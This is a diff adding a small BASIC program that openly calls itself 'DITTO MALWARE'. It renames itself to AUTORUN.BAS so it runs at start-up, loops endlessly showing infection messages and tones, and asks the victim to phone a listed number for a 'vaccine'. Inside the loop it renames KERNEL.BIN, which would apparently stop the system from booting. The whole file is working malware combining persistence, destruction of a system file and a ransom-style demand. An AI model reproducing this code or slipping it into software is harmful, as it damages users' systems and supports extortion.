@@ -1,0 +1,53 @@
+RENAME "NEWAPP.BAS" "AUTORUN.BAS" 
+
+RUN:
+print "GREETINGS 2 YOU FROM UGANDA"
+sound 2400 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3600 10
+sound 4000 10
+CLS
+print "COMPUTER IS OFFICIALLY INFECTED WITH MALWARE"
+sound 2400 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3600 10
+sound 4000 10
+CLS
+print "MALWARE NAME - DITTO MALWARE"
+sound 2400 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3600 10
+sound 4000 10
+CLS
+print "COPYRIGHT 2024 - CONTACT ME FOR VACCINE: +256 7083-360801"
+sound 2400 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3200 10
+sound 3000 10
+sound 3600 10
+sound 4000 10
+RENAME "KERNEL.BIN" "UGANDA._NN"
+CLS
+GOTO RUN
